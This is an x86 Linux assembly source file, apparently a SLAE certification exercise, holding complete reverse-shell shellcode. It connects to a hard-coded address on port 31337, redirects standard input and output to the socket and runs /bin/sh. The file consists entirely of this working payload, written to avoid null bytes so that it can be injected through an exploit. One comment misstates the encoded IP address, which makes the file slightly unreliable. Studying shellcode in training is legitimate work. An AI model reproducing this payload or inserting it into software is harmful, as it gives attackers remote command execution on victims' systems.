;
; Default ip address = 127.0.0.1
; Default port = 31337
; 
; Tested on:
; Ubuntu 17.04 
; Linux 4.10.0-42-generic i686
; 
; This has been created for completing the requirements of the 
; SecurityTube Linux Assembly Expert certification: 
; http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;  
; Student ID: SLAE-966 
; 
; References: 
; Hacking: The Art of Exploitation by Jon Erickson
; http://man7.org/linux/man-pages/man2/
;

global _start
section .text

_start:
	; s = socket(2, 1, 0)
	push BYTE 0x66 	; socketcall (syscall 102)
	pop eax
	cdq			   	; zero out edx
	xor ebx, ebx 
	inc ebx			; ebx=1 SYS_SOCKET
	push edx		; Build arg array: { protocol = 0,(in reverse) SOCK_STREAM = 1,AF_INET = 2 }
	push BYTE 0x1 
	push BYTE 0x2 
	mov ecx, esp 
	int 0x80
	
	xchg esi, eax	; save sockfd in esi

	; connect(s, [2, 31337, <IP address>], 16)
	push BYTE 0x66 			; socketcall 
	pop eax
	inc ebx 				; ebx = 2 (needed for AF_INET)
	push DWORD 0x0101017f 	; Build sockaddr struct: IP address = 127.0.0.1
	push WORD 0x697a 		; (in reverse order) PORT = 31337 AF_INET = 2
	push WORD bx 
	mov ecx, esp 
	push BYTE 16 			; size = 16
	push ecx 
	push esi 
	mov ecx, esp
	inc ebx 		 		; ebx = 3  SYS_CONNECT 
	int 0x80 

	; dup2(connected socket, {all three standard I/O file descriptors})
	xchg eax, ebx			; put sockfd in ebx
	push BYTE 0x2 			; ecx starts at 2
	pop ecx
loop:
	mov BYTE al, 0x3F 	; dup2 (syscall 63)
	int 0x80
	dec ecx 			; decrement to 0
	jns loop			; If the sign flag is not set, ecx is not negative.

	; execve(const char *filename, char *const argv [], char *const envp[])
	mov BYTE al, 0xb 	; execve (syscall 11)
	push edx			; push NULL for string termination
	push 0x68732f2f 	; push "//sh" 
	push 0x6e69622f 	; push "/bin"
	mov ebx, esp
	push edx
	mov edx, esp 
	push ebx
	mov ecx, esp 
	int 0x80